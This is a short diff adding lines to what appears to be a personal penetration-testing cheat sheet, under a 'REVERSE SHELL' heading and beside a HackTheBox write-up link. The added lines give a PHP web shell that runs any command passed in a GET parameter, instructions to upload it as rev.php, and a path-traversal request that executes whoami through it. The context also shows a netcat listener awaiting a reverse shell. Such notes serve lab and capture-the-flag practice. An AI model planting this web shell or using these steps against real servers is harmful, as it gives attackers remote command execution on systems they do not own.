@@ -595,6 +595,17 @@ https://exp1o1t9r.com/2020/01/31/hackthebox-lazy-writeup/
 =============
 REVERSE SHELL
 ============= 
+UPLOAD
+<?php echo shell_exec($_GET["cmd"]); exit; ?>   as rev.php
+
+EXECUTE
+../../../rev.php&cmd=whoami
+
+
+
+
+
+
 attacker(host)          nc -nvlp 4444
 
 
